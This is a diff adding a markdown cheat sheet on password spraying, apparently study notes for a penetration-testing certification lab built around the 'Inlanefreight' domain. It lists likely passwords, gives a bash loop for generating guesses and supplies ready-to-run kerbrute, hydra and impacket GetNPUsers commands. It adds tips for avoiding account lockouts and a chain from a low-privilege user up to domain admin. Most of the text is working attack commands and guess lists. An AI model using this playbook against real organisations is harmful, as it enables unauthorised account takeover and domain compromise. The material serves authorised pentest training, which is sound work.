@@ -1,0 +1,116 @@
+🔍 1. COLLECT INFO
+Before You Spray, Know:
+✅ Username format (j.doe, jdoe, john.doe, etc.)
+
+✅ Password policy (length, complexity, expiration)
+
+✅ Company naming conventions (e.g., Inlanefreight)
+
+✅ Public keywords (seasons, slogans, brands, team names)
+
+✅ Email dump/LinkedIn employees for user generation
+
+🛠️ 2. BUILD HIGH-PROBABILITY GUESS LIST
+Top “Human” Guesses — Use These First (Smart Guess Mode)
+text
+Copy
+Edit
+Spring2024!
+Spring24!
+Summer24!
+Inlane01!
+Inlane2024!
+Welcome1!
+Welcome2024!
+Inlanefreight01!
+April2024!
+Company@2024
+Firstname@123
+Firstname2024!
+Generate programmatically (example):
+
+bash
+Copy
+Edit
+for name in $(cat users.txt); do
+  echo "${name}01!"
+  echo "${name^}2024!"
+  echo "${name^}@123"
+done >> guesses.txt
+🔒 3. SLOW MODE SPRAYING (With Lockout Risk)
+1 attempt per user per round, rotate guesses
+
+⏳ Tools: kerbrute, hydra, ncrack, crowbar, crackmapexec
+bash
+Copy
+Edit
+kerbrute passwordspray -d inlanefreight.htb users.txt guesses.txt
+bash
+Copy
+Edit
+hydra -L users.txt -P guesses.txt rdp://<target-ip> -t 1 -W 3
+⚠️ Wait 15–30 minutes before retrying next password guess to avoid lockouts.
+
+🚀 4. FAST MODE SPRAYING (No Lockout)
+Use for:
+
+OWA portals with no lockout
+
+Kerberos AS-REP / RC4 brute
+
+Internal pentest lab environments
+
+bash
+Copy
+Edit
+hydra -L users.txt -P guesses.txt rdp://<target-ip> -V -t 4
+bash
+Copy
+Edit
+impacket-GetNPUsers inlanefreight.htb/ -usersfile users.txt -outputfile asrep_hashes.txt -format john
+🧬 5. ADD MUTATIONS BASED ON:
+Pattern	Examples
+Months	April2024, April24!, April@2024
+Seasons	Spring24!, Summer2024!
+Company Name	Inlane01!, Inlanefreight2024
+Years	2023, 2024, 2025
+Variants	Welcome1!, Welcome@2024, Company#1
+Names	Mark@123, John@24!, Mike2024!
+🧪 6. LEVERAGE PASSWORD POLICY DATA
+🧩 If min length = 8, don't waste time on shorter guesses
+
+🔐 If complexity is off — remove symbols from some guesses
+
+🔁 If expiration = 60d — try recent months (Mar24, Apr24)
+
+💥 7. SPRAY TOOLS ROUND-UP (All Stars)
+Tool	Use Case
+kerbrute	Spray via Kerberos
+hydra	RDP/FTP/SSH/webform brute
+ncrack	Fast brute for SSH, RDP
+crowbar	RDP + SSH brute
+crackmapexec	SMB auth checks, spray, validate
+GetNPUsers	AS-REP roastable accounts
+pypsrp, evil-winrm	Validate creds interactively
+🎯 8. CPTS Tactic: Focused Access Chain
+Spray for one low-priv user
+
+Use CME to validate + enumerate group access
+
+Pivot with SharpHound/BloodHound
+
+Spray again from internal with different tool sets (e.g., rpcclient, winrm, SMBMap)
+
+Chain creds → local admin → domain user → domain admin
+
+📁 BONUS: Save Your Hits + Failures
+bash
+Copy
+Edit
+hydra -L users.txt -P guesses.txt rdp://target -o hits.txt
+Use --show flags in john, hashcat, hydra, etc., to keep track of cracked hits.
+
+🧨 Final Pro Tip
+Spray like a sniper, not a shotgun.
+High-confidence guesses > bloated lists.
+Use policy intel + OSINT + mutations = fast wins 💯
